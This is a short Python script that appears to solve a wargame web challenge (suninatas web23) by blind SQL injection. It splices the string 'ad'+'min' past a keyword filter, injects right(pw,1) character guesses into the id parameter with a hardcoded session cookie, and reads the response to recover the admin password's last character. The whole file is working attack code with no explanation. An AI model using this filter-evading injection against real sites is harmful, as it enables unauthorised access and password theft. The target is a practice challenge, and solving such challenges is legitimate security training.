# -*- coding: utf-8 -*- 
import requests 
# url
url = "http://suninatas.com/challenge/web23/web23.asp"
 
cookie = {"ASPSESSIONIDCSSCCCBB" : "KPFDBEICFONODJOEKNGCGIDL"}
wordlist = "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ<>?!@#$%^&*()_+"
result  = ""
 

for k in range(0, len(wordlist)):
    query = "ad'+'min'and right(pw,1)='"+wordlist[k]+"'--" 
    response = requests.get(url, params={'id': query, 'pw': 'qwerty'}, cookies=cookie)
    
    if "OK" in response.text:
        result += wordlist[k]
        break
 
print("[!]" + result + "입니다.")